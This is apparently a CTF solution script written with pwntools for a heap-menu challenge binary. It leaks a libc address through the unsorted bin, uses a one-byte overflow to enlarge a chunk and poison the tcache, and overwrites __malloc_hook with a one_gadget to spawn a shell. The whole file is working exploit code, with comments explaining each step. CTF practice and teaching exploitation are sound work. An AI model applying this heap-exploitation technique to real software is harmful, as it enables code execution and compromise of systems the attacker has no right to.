import pwn 
from pwn import *

context.binary = "chall_patched"
context.log_level = 'DEBUG'

elf = ELF("./chall_patched")
p = elf.process()
libc = ELF("./libc.so")

def Malloc(size,content):
 p.recvuntil(b"Command:\n")
 p.sendline(b"M")
 p.sendlineafter(b"Size:\n",size)
 p.sendlineafter(b"Content:\n",content)

def Free(idx):
 p.recvuntil(b"Command:\n")
 p.sendline(b"F")
 p.sendlineafter(b"Index:\n",idx)

def Show(idx):
 p.recvuntil(b"Command:\n")
 p.sendline(b"S")
 p.sendlineafter(b"Index:\n",idx)

Malloc(b"376",b"") #we malloc 9 times while keeping the contents empty
Malloc(b"376",b"")
Malloc(b"376",b"")
Malloc(b"376",b"")
Malloc(b"376",b"")
Malloc(b"376",b"")
Malloc(b"376",b"")
Malloc(b"376",b"")
Malloc(b"376",b"")
Free(b"0") #we free 8 times i.e 8 chunks so the first 7 chunks go into tcache and the 8th one goes into unsorted bins and its fd is updated with a arena libc address
Free(b"1") 
Free(b"2")
Free(b"3")
Free(b"4")
Free(b"5")
Free(b"6")
Free(b"7")

#pwn.gdb.attach(p,'''
#brva *13CC
#''')

Malloc(b"248",b"") #allocated from the unsorted bin as it was a chunk of size 376 and we requested 248 the remaining is split and gets added to the smallbins
Show(b"0") #we use show to leak the libc address #chunk0
p.recvuntil(b"> ")
libc_leak = u64(p.recv(6).strip().ljust(8,b"\x00"))
libc_puts = libc_leak - 0x161150
libc_base = libc_puts - libc.sym["puts"]
one = libc_base + 0xe2383 # we calculate libc_base,one_gadget,malloc_hook,free_hook addresses
free_hook = libc_base + libc.sym["__free_hook"]
malloc_hook = libc_base + libc.sym["__malloc_hook"]

log.info("libc_leak: {}".format(hex(libc_leak)))
log.info("libc_puts: {}".format(hex(libc_puts)))
log.info("libc_base: {}".format(hex(libc_base)))
log.info("one_gadget: {}".format(hex(one)))
log.info("free_hook: {}".format(hex(free_hook)))
log.info("malloc_hook: {}".format(hex(malloc_hook)))

Malloc(b"248",b"") #chunk1 # we clear out the chunks in the freelist to make space in the tcache for new chunks to be filled 
Malloc(b"376",b"") #chunk2
Malloc(b"376",b"") #chunk3
#Malloc(b"376",b"")

Malloc(b"248",b"4") #chunk4 #we malloc three new chunks to perform the single byte overflow 
Malloc(b"248",b"5") #chunk5 
Malloc(b"248",b"6") #chunk6
Free(b"6") # chunk6 freed gets added to head of tcache
Free(b"4") # chunk4 freed added at head of tcache
Malloc(b"248",b"4"*248+b"\x81") #chunk4 is allocated as it was at the head of the tcache list(LIFO manner) so we fill it up to its chunksize and overflow a single \x81 into the next chunk's(chunk5) prevsize making it 0x181 from 0x101
Free(b"5") #when we free chunk5 it gets added to the 0x180 tcache freelist and gets added to the head 
Malloc(b"376",b"5"*256+p64(malloc_hook)[:-2]) # the single byte overflow lead to a much larger overflow as it got us extra space to write whatever we want into the next chunk as chunk6 is in the tcache freelist we fill the chunk5 until before the location of chunk6's fd pointer, and we overwrite chunk6's fd with malloc_hook

Malloc(b"248",b"") #chunk at head of 0x100 tcache freelist
Malloc(b"248",p64(one)[:-2]) #chunk containing malloc hook, we overwrite that with the one_gadget's address so that everytime malloc is called /bin/sh is executed and we get a shell
p.sendline(b"M") # we malloc a chunk
p.sendline(b"8") # shell is popped up, we can also use free_hook and overwrite it with one_gadget to get a shell

p.interactive()
